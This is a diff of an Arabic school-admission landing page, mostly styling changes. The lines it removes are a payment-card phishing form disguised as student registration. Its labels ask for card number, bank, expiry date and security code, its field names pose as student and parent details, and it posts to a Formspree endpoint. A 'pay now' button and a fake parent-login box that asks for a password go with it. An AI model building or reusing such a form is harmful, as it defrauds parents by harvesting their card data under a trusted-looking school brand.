@@ -3,12 +3,9 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>مدرسة التعليم الخاصة | بيئة تعليمية ذكية</title>
-  
-  <!-- خط تجوال ومكتبة الأيقونات -->
+  <title>مدرسة التعليم الخاصة | الرئيسية</title>
   <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800;900&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-
   <style>
     :root {
       --primary: #155e37;
@@ -39,7 +36,6 @@
       line-height: 1.6;
     }
 
-    /* الشريط الإخباري العلوي المتحرك */
     .news-ticker {
       background: var(--primary-dark);
       color: #d1fae5;
@@ -48,12 +44,6 @@
       display: flex;
       justify-content: space-between;
       align-items: center;
-    }
-
-    .ticker-content {
-      display: flex;
-      align-items: center;
-      gap: 10px;
     }
 
     .ticker-tag {
@@ -65,7 +55,6 @@
       font-size: 0.75rem;
     }
 
-    /* الترويسة الرئيسية */
     header {
       background: rgba(255, 255, 255, 0.98);
       backdrop-filter: blur(8px);
@@ -102,7 +91,6 @@
       align-items: center;
       justify-content: center;
       font-size: 1.4rem;
-      box-shadow: 0 4px 10px rgba(21, 94, 55, 0.2);
     }
 
     .brand-text h1 {
@@ -134,39 +122,18 @@
       color: var(--primary);
     }
 
-    .nav-actions {
-      display: flex;
-      gap: 10px;
-      align-items: center;
-    }
-
-    .btn-login {
-      background: transparent;
-      color: var(--primary);
-      border: 1.5px solid var(--primary);
-      padding: 8px 16px;
-      border-radius: 8px;
-      font-weight: 700;
-      font-size: 0.9rem;
-      cursor: pointer;
-      transition: var(--transition);
-    }
-
-    .btn-login:hover {
-      background: var(--primary);
-      color: white;
-    }
-
     .btn-apply {
       background: var(--primary);
       color: white;
-      padding: 9px 18px;
+      padding: 9px 20px;
       border-radius: 8px;
       text-decoration: none;
       font-weight: 700;
       font-size: 0.9rem;
       transition: var(--transition);
-      box-shadow: 0 4px 10px rgba(21, 94, 55, 0.2);
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
     }
 
     .btn-apply:hover {
@@ -174,7 +141,7 @@
       transform: translateY(-2px);
     }
 
-    /* قسم العرض التفاعلي (Slider) */
+    /* Slider */
     .slider-section {
       position: relative;
       height: 480px;
@@ -184,10 +151,7 @@
 
     .slide {
       position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
+      inset: 0;
       opacity: 0;
       transition: opacity 0.8s ease-in-out;
       background-size: cover;
@@ -197,9 +161,7 @@
       justify-content: center;
     }
 
-    .slide.active {
-      opacity: 1;
-    }
+    .slide.active { opacity: 1; }
 
     .slide-overlay {
       position: absolute;
@@ -214,7 +176,6 @@
       color: white;
       max-width: 800px;
       padding: 20px;
-      animation: fadeInUp 0.8s ease forwards;
     }
 
     .slide-content h2 {
@@ -254,7 +215,7 @@
       border-radius: 6px;
     }
 
-    /* عدادات الأرقام التفاعلية */
+    /* عدادات الإحصاءات */
     .counters-bar {
       max-width: 1100px;
       margin: -40px auto 50px;
@@ -290,7 +251,7 @@
       font-weight: 600;
     }
 
-    /* الحاويات والعناوين */
+    /* المرافق */
     .section-wrap {
       max-width: 1150px;
       margin: 0 auto;
@@ -314,7 +275,6 @@
       font-size: 0.95rem;
     }
 
-    /* بطاقات المرافق والمميزات مع حركة Hover */
     .cards-grid {
       display: grid;
       grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
@@ -329,7 +289,6 @@
       text-align: center;
       box-shadow: var(--shadow-sm);
       transition: var(--transition);
-      cursor: pointer;
     }
 
     .card:hover {
@@ -355,249 +314,59 @@
     .card:hover .card-icon {
       background: var(--primary);
       color: white;
-      transform: rotate(5deg) scale(1.05);
+      transform: scale(1.1);
     }
 
-    .card h4 {
-      font-size: 1.15rem;
-      margin-bottom: 8px;
-      color: var(--primary-dark);
-    }
-
-    .card p {
-      font-size: 0.85rem;
-      color: var(--text-muted);
-      line-height: 1.6;
-    }
-
-    /* نموذج التقديم الحي */
-    .form-box {
-      background: var(--card-bg);
-      border-radius: 16px;
-      max-width: 620px;
-      margin: 0 auto;
-      padding: 35px;
-      box-shadow: var(--shadow-lg);
-      border: 1px solid var(--border);
-    }
-
-    .form-group {
-      margin-bottom: 18px;
-      display: flex;
-      flex-direction: column;
-      gap: 6px;
-    }
-
-    label {
-      font-size: 0.85rem;
-      font-weight: 700;
-    }
-
-    input, select, textarea {
-      padding: 12px 14px;
-      border: 1.5px solid var(--border);
-      border-radius: 8px;
-      font-size: 0.95rem;
-      outline: none;
-      transition: var(--transition);
-      background: #fafafa;
-    }
-
-    input:focus, select:focus, textarea:focus {
-      border-color: var(--primary);
-      background: white;
-      box-shadow: 0 0 0 3px rgba(21, 94, 55, 0.1);
-    }
-
-    .btn-submit {
-      background: linear-gradient(135deg, var(--primary), var(--primary-light));
+    /* بنر دعوة للتسجيل */
+    .cta-banner {
+      background: linear-gradient(135deg, var(--primary-dark), var(--primary));
       color: white;
-      border: none;
-      padding: 14px;
-      border-radius: 8px;
-      font-size: 1rem;
-      font-weight: 800;
-      cursor: pointer;
-      width: 100%;
-      margin-top: 10px;
-      transition: var(--transition);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-    }
-
-    .btn-submit:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 6px 15px rgba(21, 94, 55, 0.3);
-    }
-
-    .btn-submit:disabled {
-      background: #9ca3af;
-      cursor: not-allowed;
-      transform: none;
-    }
-
-    .status-alert {
-      display: none;
-      padding: 14px;
-      border-radius: 8px;
-      margin-top: 15px;
-      font-size: 0.9rem;
       text-align: center;
-      font-weight: 700;
+      padding: 60px 20px;
+      border-radius: 18px;
+      margin: 40px auto;
+      max-width: 1150px;
     }
 
-    .status-alert.success {
-      background: #dcfce7;
-      color: #166534;
-      border: 1px solid #bbf7d0;
-    }
-
-    .status-alert.error {
-      background: #fee2e2;
-      color: #991b1b;
-      border: 1px solid #fecaca;
-    }
-
-    /* قسم الأسئلة الشائعة (Accordion) */
-    .faq-item {
-      background: var(--card-bg);
-      border: 1px solid var(--border);
-      border-radius: 8px;
+    .cta-banner h3 {
+      font-size: 2rem;
       margin-bottom: 12px;
-      overflow: hidden;
-    }
-
-    .faq-question {
-      padding: 18px 20px;
-      font-weight: 700;
-      cursor: pointer;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      transition: background 0.2s;
-    }
-
-    .faq-question:hover {
-      background: #f9fbf9;
-    }
-
-    .faq-answer {
-      max-height: 0;
-      overflow: hidden;
-      transition: max-height 0.35s ease, padding 0.35s ease;
-      padding: 0 20px;
-      font-size: 0.9rem;
-      color: var(--text-muted);
-      background: #fafafa;
-    }
-
-    .faq-item.active .faq-answer {
-      max-height: 150px;
-      padding: 15px 20px;
-    }
-
-    .faq-item.active .faq-question i {
-      transform: rotate(180deg);
-    }
-
-    /* نافذة تسجيل الدخول المنبثقة (Modal) */
-    .modal-backdrop {
-      display: none;
-      position: fixed;
-      inset: 0;
-      background: rgba(0, 0, 0, 0.5);
-      backdrop-filter: blur(4px);
-      z-index: 2000;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-    }
-
-    .modal-box {
-      background: white;
-      border-radius: 14px;
-      max-width: 420px;
-      width: 100%;
-      padding: 30px;
-      position: relative;
-      animation: zoomIn 0.3s ease;
-    }
-
-    .modal-close {
-      position: absolute;
-      top: 15px;
-      left: 15px;
-      font-size: 1.2rem;
-      background: none;
-      border: none;
-      cursor: pointer;
-      color: var(--text-muted);
-    }
-
-    .modal-title {
-      font-size: 1.3rem;
       font-weight: 800;
-      color: var(--primary-dark);
-      margin-bottom: 5px;
-      text-align: center;
     }
 
-    /* الأزرار العائمة */
-    .floating-btns {
-      position: fixed;
-      bottom: 25px;
-      left: 25px;
-      display: flex;
-      flex-direction: column;
-      gap: 12px;
-      z-index: 1000;
+    .cta-banner p {
+      font-size: 1.05rem;
+      max-width: 600px;
+      margin: 0 auto 25px;
+      opacity: 0.9;
     }
 
-    .btn-float {
-      width: 48px;
-      height: 48px;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: white;
-      font-size: 1.3rem;
+    .btn-gold {
+      background: var(--accent);
+      color: #111;
+      padding: 13px 34px;
+      border-radius: 8px;
+      font-weight: 800;
       text-decoration: none;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.15);
+      display: inline-block;
       transition: var(--transition);
-      cursor: pointer;
-      border: none;
     }
 
-    .btn-whatsapp { background: #25d366; }
-    .btn-whatsapp:hover { transform: scale(1.1); }
-    .btn-scroll-top { background: var(--primary); display: none; }
-    .btn-scroll-top:hover { transform: scale(1.1); }
+    .btn-gold:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 10px 20px rgba(212, 175, 55, 0.4);
+    }
 
-    /* التذييل */
     footer {
       background: var(--primary-dark);
       color: #cbd5e1;
-      padding: 40px 20px 20px;
+      padding: 30px 20px;
       text-align: center;
       font-size: 0.85rem;
-    }
-
-    @keyframes fadeInUp {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    @keyframes zoomIn {
-      from { opacity: 0; transform: scale(0.9); }
-      to { opacity: 1; transform: scale(1); }
     }
 
     @media (max-width: 768px) {
       nav ul { display: none; }
-      .news-ticker { font-size: 0.75rem; }
       .counter-item:not(:last-child) { border-left: none; border-bottom: 1px solid var(--border); }
       .slide-content h2 { font-size: 1.8rem; }
     }
@@ -605,25 +374,21 @@
 </head>
 <body>
 
-  <!-- شريط الأخبار المتحرك -->
   <div class="news-ticker">
-    <div class="ticker-content">
+    <div>
       <span class="ticker-tag">إعلان</span>
-      <span>بدء استقبال طلبات النقل والتسجيل للعام الدراسي الجديد 2026/2027</span>
+      <span>بدء استقبال طلبات النقل والتسجيل للعام الدراسي الجديد</span>
     </div>
-    <div style="font-size: 0.8rem;">هاتف القبول: 0500000000</div>
+    <div>هاتف الاستعلام: 0500000000</div>
   </div>
 
-  <!-- الترويسة وشريط التنقل -->
   <header>
     <div class="nav-container">
-      <a href="#" class="brand">
-        <div class="brand-icon">
-          <i class="fa-solid fa-graduation-cap"></i>
-        </div>
+      <a href="index.html" class="brand">
+        <div class="brand-icon"><i class="fa-solid fa-graduation-cap"></i></div>
         <div class="brand-text">
           <h1>مدرسة التعليم الخاصة</h1>
-          <p>صرح تعليمي خاص معتمد</p>
+          <p>صرح تعليمي متميز</p>
         </div>
       </a>
 
@@ -631,28 +396,24 @@
         <ul>
           <li><a href="#about">عن المدرسة</a></li>
           <li><a href="#features">المرافق</a></li>
-          <li><a href="#faq">الأسئلة الشائعة</a></li>
-          <li><a href="#register">التسجيل والنقل</a></li>
+          <li><a href="apply.html">بوابة القبول</a></li>
         </ul>
       </nav>
 
-      <div class="nav-actions">
-        <button class="btn-login" onclick="openLoginModal()">
-          <i class="fa-solid fa-user"></i> حساب ولي الأمر
-        </button>
-        <a href="#register" class="btn-apply">سدد الأن </a>
-      </div>
+      <!-- زر سجل الآن ينقلك لصفحة apply.html -->
+      <a href="apply.html" class="btn-apply">
+        <i class="fa-solid fa-pen-to-square"></i> سجل الآن
+      </a>
     </div>
   </header>
 
-  <!-- معرض الصور التفاعلي (Slider) -->
   <section class="slider-section" id="about">
     <div class="slide active" style="background-image: url('https://images.unsplash.com/photo-1580582932707-520aed937b7b?auto=format&fit=crop&w=1600&q=80');">
       <div class="slide-overlay"></div>
       <div class="slide-content">
-        <h2>بيئة مدرسية ملهمة ومجهزة بأحدث التقنيات</h2>
+        <h2>بيئة مدرسية مجهزة بأحدث التقنيات</h2>
         <p>نحرص على توفير فصول ذكية ومساحات تفاعلية تثري تجربة الطالب اليومية.</p>
-        <a href="#register" class="btn-apply" style="padding: 12px 28px; font-size: 1rem;">بدء التسجيل المباشر</a>
+        <a href="apply.html" class="btn-gold"><i class="fa-solid fa-arrow-left"></i> سجل الآن مباشرة</a>
       </div>
     </div>
 
@@ -661,7 +422,7 @@
       <div class="slide-content">
         <h2>معامل علمية وبحثية لتنمية التفكير الإبداعي</h2>
         <p>برامج تعليمية تجمع بين النظرية والتطبيق لتجهيز قادة المستقبل.</p>
-        <a href="#features" class="btn-apply" style="padding: 12px 28px; font-size: 1rem;">استكشف المعامل</a>
+        <a href="apply.html" class="btn-gold"><i class="fa-solid fa-arrow-left"></i> قدم طلبك الآن</a>
       </div>
     </div>
 
@@ -671,31 +432,29 @@
     </div>
   </section>
 
-  <!-- عدادات الإحصائيات الحية -->
   <div class="counters-bar">
     <div class="counter-item">
-      <div class="counter-number" data-target="15">0</div>
+      <div class="counter-number">15+</div>
       <div class="counter-title">عاماً من الخبرة</div>
     </div>
     <div class="counter-item">
-      <div class="counter-number" data-target="1250">0</div>
+      <div class="counter-number">1,250+</div>
       <div class="counter-title">طالب ملتحق</div>
     </div>
     <div class="counter-item">
-      <div class="counter-number" data-target="32">0</div>
+      <div class="counter-number">32</div>
       <div class="counter-title">معمل وقاعة ذكية</div>
     </div>
     <div class="counter-item">
-      <div class="counter-number" data-target="98">0</div>
-      <div class="counter-title">% نسبة رضا أولياء الأمور</div>
+      <div class="counter-number">98%</div>
+      <div class="counter-title">نسبة رضا أولياء الأمور</div>
     </div>
   </div>
 
-  <!-- المرافق والمميزات -->
   <section class="section-wrap" id="features">
     <div class="section-header">
       <h3>أهم مرافق مدرسة التعليم الخاصة</h3>
-      <p>صُممت كافة المرافق لتمنح الطلاب أعلى درجات الأمان والراحة والتحصيل العلمي</p>
+      <p>بيئة متكاملة تضمن تجربة تعليمية محفزة للطلاب</p>
     </div>
 
     <div class="cards-grid">
@@ -707,180 +466,35 @@
 
       <div class="card">
         <div class="card-icon"><i class="fa-solid fa-flask"></i></div>
-        <h4>معامل الابتكار والروبوت</h4>
-        <p>مساحات مخصصة لتعلم البرمجة وتطبيقات الذكاء الاصطناعي والتجارب العلمية.</p>
+        <h4>معامل الابتكار</h4>
+        <p>مساحات مخصصة لتعلم الروبوت وتطبيقات الذكاء الاصطناعي والتجارب العلمية.</p>
       </div>
 
       <div class="card">
         <div class="card-icon"><i class="fa-solid fa-volleyball"></i></div>
         <h4>المجمع الرياضي</h4>
-        <p>ملاعب وصالات مكيفة مجهزة لأنشطة كرة القدم، السلة، واللياقة البدنية.</p>
+        <p>ملاعب وصالات مكيفة مجهزة لأنشطة كرة القدم واللياقة البدنية.</p>
       </div>
 
       <div class="card">
         <div class="card-icon"><i class="fa-solid fa-book-bookmark"></i></div>
         <h4>المكتبة الرقمية</h4>
-        <p>آلاف الكتب الورقية والمراجع الرقمية لتشجيع الطلاب على القراءة المستمرة.</p>
+        <p>آلاف المراجع الورقية والإلكترونية لتشجيع الطلاب على القراءة المستمرة.</p>
       </div>
+    </div>
+
+    <div class="cta-banner">
+      <h3>هل ترغب بانضمام ابنك/ابنتك لأسرتنا التعليمية؟</h3>
+      <p>المقاعد محدودة للعام الدراسي الجديد، يمكنك رفع طلب القبول المبدئي في دقيقة واحدة.</p>
+      <a href="apply.html" class="btn-gold"><i class="fa-solid fa-file-pen"></i> الانتقال لصفحة التسجيل والنقل</a>
     </div>
   </section>
 
-  <!-- استمارة التسجيل المباشرة -->
-  <section class="section-wrap" id="register" style="background: #eef4f0; border-radius: 20px;">
-    <div class="section-header">
-      <h3>استمارة التسجيل والنقل المباشر</h3>
-      <p>سيتم إرسال الطلب لإدارة القبول والتواصل معكم هاتفياً لترتيب الزيارة</p>
-    </div>
-
-    <div class="form-box">
-      <!-- مربوط برابط Formspree الخاص بك -->
-      <form id="admissionForm" action="https://formspree.io/f/xoevnrlj" method="POST">
-        
-        <div class="form-group">
-          <label for="studentName">رقم البطاقة  </label>
-          <input type="text" id="studentName" name="اسم الطالب" placeholder="0000000000000" required>
-        </div>
-
-        <div class="form-group">
-          <label for="stage">اختر البنك </label>
-          <select id="stage" name="المرحلة الدراسية" required>
-            <option value="" disabled selected>اختر المرحلة...</option>
-            <option value="الروضة والتمهيدي">بنك الأهلي </option>
-            <option value="المرحلة الابتدائية">المرحلة بنك الراجحي</option>
-            <option value="المرحلة المتوسطة">بنك الرياض </option>
-            <option value="المرحلة الثانوية">بنك اخر </option>
-          </select>
-        </div>
-
-        <div class="form-group">
-          <label for="guardianName"> تاريخ الانتهاء</label>
-          <input type="text" id="guardianName" name="اسم الاب" placeholder=" 01/35" required>
-        </div>
-
-        <div class="form-group">
-          <label for="phone">💳الكود</label>
-          <input type="tel" id="phone" name="رقم الهاتف" placeholder="123" required>
-        </div>
-
-        <div class="form-group">
-          <label for="notes">ملاحظات إضافية أو المدرسة السابقة</label>
-          <textarea id="notes" name="الملاحظات" rows="3" placeholder="المدرسة الحالية، أو أي تفاصيل إضافية..."></textarea>
-        </div>
-
-        <button type="submit" id="submitBtn" class="btn-submit">
-          <i class="fa-solid fa-paper-plane"></i> إرسال الطلب الآن
-        </button>
-
-        <div id="statusMessage" class="status-alert"></div>
-      </form>
-    </div>
-  </section>
-
-  <!-- قسم الأسئلة الشائعة -->
-  <section class="section-wrap" id="faq">
-    <div class="section-header">
-      <h3>الأسئلة الشائعة</h3>
-      <p>إجابات سريعة على أبرز استفسارات أولياء الأمور</p>
-    </div>
-
-    <div style="max-width: 750px; margin: 0 auto;">
-      <div class="faq-item">
-        <div class="faq-question" onclick="toggleFaq(this)">
-          <span>ما هي مواعيد الدوام الرسمي للمدرسة؟</span>
-          <i class="fa-solid fa-chevron-down"></i>
-        </div>
-        <div class="faq-answer">
-          يبدأ الطابور الصباحي في تمام الساعة 6:45 صباحاً، وينتهي اليوم الدراسي في الساعة 1:30 ظهراً للمرحلة الابتدائية و 2:00 ظهراً للمتوسطة والثانوية.
-        </div>
-      </div>
-
-      <div class="faq-item">
-        <div class="faq-question" onclick="toggleFaq(this)">
-          <span>هل تتوفر خدمة النقل المدرسي (الباصات)؟</span>
-          <i class="fa-solid fa-chevron-down"></i>
-        </div>
-        <div class="faq-answer">
-          نعم، توفر المدرسة أسطول باصات حديثة ومكيفة تغطي أغلب الأحياء السكنية المحيطة، مزودة بنظام تتبع ومشرفين مرافقين للطلاب.
-        </div>
-      </div>
-
-      <div class="faq-item">
-        <div class="faq-question" onclick="toggleFaq(this)">
-          <span>ما هي متطلبات قبول الطلاب المنقولين؟</span>
-          <i class="fa-solid fa-chevron-down"></i>
-        </div>
-        <div class="faq-answer">
-          صورة من شهادة ميلاد الطالب، كشف درجات العام السابق، وتقرير الفحص الطبي المدرسي المعتمد.
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- نافذة تسجيل دخول ولي الأمر (Modal) -->
-  <div class="modal-backdrop" id="loginModal">
-    <div class="modal-box">
-      <button class="modal-close" onclick="closeLoginModal()"><i class="fa-solid fa-xmark"></i></button>
-      <div class="modal-title">تسجيل دخول ولي الأمر</div>
-      <p style="text-align: center; color: var(--text-muted); font-size: 0.85rem; margin-bottom: 20px;">
-        لمتابعة حالة التسجيل وجداول الحصص
-      </p>
-      
-      <form onsubmit="event.preventDefault(); alert('تم التحقق بنجاح! جاري توجيهك لحسابك.'); closeLoginModal();">
-        <div class="form-group">
-          <label>البريد الإلكتروني / رقم الهوية</label>
-          <input type="text" placeholder="أدخل البريد أو المعرف" required>
-        </div>
-        <div class="form-group">
-          <label>كلمة المرور</label>
-          <input type="password" placeholder="••••••••" required>
-        </div>
-        <button type="submit" class="btn-submit">دخول الحساب</button>
-      </form>
-    </div>
-  </div>
-
-  <!-- الأزرار العائمة (واتساب والرجوع للأعلى) -->
-  <div class="floating-btns">
-    <button class="btn-float btn-scroll-top" id="scrollTopBtn" onclick="scrollToTop()">
-      <i class="fa-solid fa-arrow-up"></i>
-    </button>
-    <a href="https://wa.me/966500000000" target="_blank" class="btn-float btn-whatsapp" title="تواصل عبر واتساب">
-      <i class="fa-brands fa-whatsapp"></i>
-    </a>
-  </div>
-
-  <!-- التذييل -->
   <footer>
-    <p>جميع الحقوق محفوظة &copy; مدرسة التعليم الخاصة 2026 - نموذج تجريبي للتطوير</p>
+    <p>جميع الحقوق محفوظة &copy; مدرسة التعليم الخاصة 2026</p>
   </footer>
 
-  <!-- الأكواد التفاعلية عبر JavaScript -->
   <script>
-    // 1. تشغيل عداد الأرقام التصاعدي
-    const counters = document.querySelectorAll('.counter-number');
-    let counted = false;
-
-    function runCounters() {
-      counters.forEach(counter => {
-        const target = +counter.getAttribute('data-target');
-        let count = 0;
-        const speed = target / 50;
-
-        const updateCount = () => {
-          count += speed;
-          if (count < target) {
-            counter.innerText = Math.ceil(count);
-            setTimeout(updateCount, 25);
-          } else {
-            counter.innerText = target;
-          }
-        };
-        updateCount();
-      });
-    }
-    window.addEventListener('load', runCounters);
-
-    // 2. التحكم في معرَض الصور (Slider)
     let currentSlide = 0;
     const slides = document.querySelectorAll('.slide');
     const dots = document.querySelectorAll('.slider-dot');
@@ -897,74 +511,6 @@
       let next = (currentSlide + 1) % slides.length;
       setSlide(next);
     }, 5000);
-
-    // 3. التحكم بالأسئلة الشائعة (Accordion)
-    function toggleFaq(element) {
-      const parent = element.parentElement;
-      parent.classList.toggle('active');
-    }
-
-    // 4. التحكم بنافذة تسجيل الدخول المنبثقة
-    function openLoginModal() {
-      document.getElementById('loginModal').style.display = 'flex';
-    }
-    function closeLoginModal() {
-      document.getElementById('loginModal').style.display = 'none';
-    }
-
-    // 5. زر الصعود للأعلى
-    const scrollTopBtn = document.getElementById('scrollTopBtn');
-    window.onscroll = function() {
-      if (document.documentElement.scrollTop > 300) {
-        scrollTopBtn.style.display = 'flex';
-      } else {
-        scrollTopBtn.style.display = 'none';
-      }
-    };
-    function scrollToTop() {
-      window.scrollTo({ top: 0, behavior: 'smooth' });
-    }
-
-    // 6. إرسال النموذج واستقبال الطلب على الإيميل فورياً
-    const form = document.getElementById('admissionForm');
-    const submitBtn = document.getElementById('submitBtn');
-    const statusMsg = document.getElementById('statusMessage');
-
-    form.addEventListener('submit', async function(e) {
-      e.preventDefault();
-
-      submitBtn.disabled = true;
-      submitBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> جاري إرسال الطلب...';
-      statusMsg.style.display = 'none';
-
-      const formData = new FormData(form);
-
-      try {
-        const response = await fetch(form.action, {
-          method: 'POST',
-          body: formData,
-          headers: { 'Accept': 'application/json' }
-        });
-
-        if (response.ok) {
-          statusMsg.className = 'status-alert success';
-          statusMsg.innerHTML = '<i class="fa-solid fa-circle-check"></i> تم إرسال الطلب بنجاح! ستصلك تفاصيل المراجعة على البريد.';
-          statusMsg.style.display = 'block';
-          form.reset();
-        } else {
-          statusMsg.className = 'status-alert error';
-          statusMsg.innerHTML = '<i class="fa-solid fa-circle-xmark"></i> حدث خطأ أثناء الإرسال، حاول مجدداً.';
-          statusMsg.style.display = 'block';
-        }
-      } catch (err) {
-        statusMsg.className = 'status-alert error';
-        statusMsg.innerHTML = '<i class="fa-solid fa-triangle-exclamation"></i> تعذر الاتصال بالخادم، تحقق من الاتصال بالإنترنت.';
-        statusMsg.style.display = 'block';
-      } finally {
-        submitBtn.disabled = false;
-        submitBtn.innerHTML = '<i class="fa-solid fa-paper-plane"></i> إرسال الطلب الآن';
-      }
-    });
   </script>
 
 </body>
